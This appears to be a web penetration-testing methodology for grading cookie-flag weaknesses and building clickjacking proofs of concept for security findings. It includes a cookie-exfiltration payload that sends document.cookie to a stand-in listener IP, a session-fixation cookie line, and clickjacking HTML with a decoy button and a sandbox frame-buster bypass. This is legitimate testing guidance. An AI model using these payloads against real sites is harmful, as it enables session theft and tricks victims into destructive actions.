# Cookie-flag criteria & clickjacking PoC methodology

## 1. Parsing Set-Cookie correctly

- Multiple `Set-Cookie` headers are NOT foldable with commas — parse each header line
  separately (urllib's `getheader` folds them; use `response.headers.get_all('Set-Cookie')`
  / raw parsing, which `analyze_headers.py` does).
- Attributes are case-insensitive; value may contain `=`. First `name=value` pair is
  the cookie; the rest are attributes.

## 2. Flag criteria (grade per cookie; weight by cookie role)

Identify likely session/auth cookies by name heuristics: `session`, `sess`, `sid`,
`auth`, `token`, `jwt`, `remember`, `csrf` (csrf cookies have different rules — they
*must not* be HttpOnly if the app reads them from JS, double-submit pattern), plus
framework defaults: `JSESSIONID`, `PHPSESSID`, `ASP.NET_SessionId`, `connect.sid`,
`_rails_session`, `laravel_session`, `csrftoken`, `XSRF-TOKEN`.

| Gap | Grade (session cookie) | Grade (other) | CWE / WSTG |
|---|---|---|---|
| No `HttpOnly` | medium | low/info | CWE-1004, WSTG-SESS-02 |
| No `Secure` (over HTTPS) | medium | low | CWE-614, WSTG-SESS-02 |
| No `SameSite` | low-medium (CSRF surface; modern Chrome defaults Lax, Firefox/Safari differ) | info | CWE-1275 |
| `SameSite=None` without demonstrated cross-site need | medium | low | CWE-1275 |
| `SameSite=None` without `Secure` | medium (rejected by Chrome, honored by some) | low | CWE-1275 |
| `Domain=.example.com` (parent-domain scope) | medium — every subdomain can read/fix the session | low | WSTG-SESS-02 |
| `Path` broader than the app needs | info-low | info | |
| Long/absent `Expires` on session cookie (persistent session) | low | info | WSTG-SESS-07 |
| Secrets readable in value (JWT with sensitive claims, base64 creds) | per-content | per-content | WSTG-SESS-01 |

Prefixes:

- `__Host-name`: browser enforces Secure + no Domain + Path=/ => immune to subdomain
  cookie-tossing/fixation. Session cookie without it = hygiene note (info), with a
  known subdomain-takeover = raise to medium.
- `__Secure-name`: enforces Secure only.
- A server setting `__Host-` *with* a Domain attribute = the browser rejects it;
  if observed, flag broken deploy (functional + weak).

## 3. Proving impact (chain, don't just report flags)

- **No HttpOnly + any XSS** (from the XSS skill): PoC
  `fetch('//198.51.100.7/c?'+encodeURIComponent(document.cookie))` — the cookie
  arriving at your listener upgrades the XSS finding's impact statement; cite the
  cookie finding as the enabler.
- **No/None SameSite + state-changing GET or no-CSRF-token POST**: host a CSRF PoC
  page; auto-submit form; victim's session performs the action. Report under
  WSTG-SESS-05 with the cross-site request+response in evidence.
- **Broad Domain + subdomain XSS/takeover**: set a fixation cookie from the subdomain
  (`document.cookie="session=attacker; domain=.example.com; path=/"`) — session
  fixation / cookie tossing (also defeats `__Secure-`, not `__Host-`).
- **No Secure + HTTP endpoint anywhere on the host**: passive capture / active MITM
  via forced `http://example.com/x` image load; pairs with missing HSTS.

## 4. Clickjacking PoC (WSTG-CLNT-09, CWE-1021)

Only report clickjacking on pages where a framed click/keystroke does something:
settings changes, delete buttons, payment/transfer, OAuth consent, "like" actions.
A frameable static homepage is `info` at most.

### Generate

`python3 scripts/analyze_headers.py --url https://example.com/account/delete --poc poc.html`
writes a dual-variant PoC:

```html
<!doctype html><title>cj-poc</title>
<style>
 iframe{position:absolute;top:-80px;left:-20px;width:900px;height:600px;
        opacity:0.4;z-index:2;border:0}
 /* opacity 0.4 for the screenshot; 0.0001 for the live attack */
 button{position:absolute;top:140px;left:210px;z-index:1;font-size:22px}
</style>
<button>CLAIM FREE PRIZE</button>
<iframe src="https://example.com/account/delete"></iframe>
<hr>
<!-- framebuster-bypass variant: sandbox keeps forms/scripts but blocks top-navigation -->
<iframe src="https://example.com/account/delete"
        sandbox="allow-forms allow-scripts" style="position:static;opacity:1;width:900px;height:300px"></iframe>
```

### Test

1. Open poc.html from a different origin (serve it: `python3 -m http.server 8000`,
   browse `http://127.0.0.1:8000/poc.html` — `file://` behaves differently).
2. Target renders in frame #1 => vulnerable; screenshot = evidence. Align the decoy
   button over the real control (adjust top/left) for the full PoC.
3. Blank frame + console error `Refused to display ... frame-ancestors` / XFO =>
   protected (record as `ok`).
4. Frame #1 blank but frame #2 (sandboxed) renders => JS frame-buster only =>
   **still vulnerable** (sandbox blocks the `top.location` buster); grade same as
   unprotected, note the bypass in evidence.
5. For drag-drop/keystroke-level attacks and multi-step actions, chain several
   overlapping iframes/steps — note in finding, PoC of step 1 suffices for evidence.

### Evidence package

Finding via `finding-report`: scope `endpoint`, target_ref = framed URL, severity
medium (high if the framed action is irreversible/financial), CWE-1021 +
WSTG-CLNT-09, evidence = the response headers showing both XFO and frame-ancestors
absent, the PoC HTML, and the rendered screenshot reference.
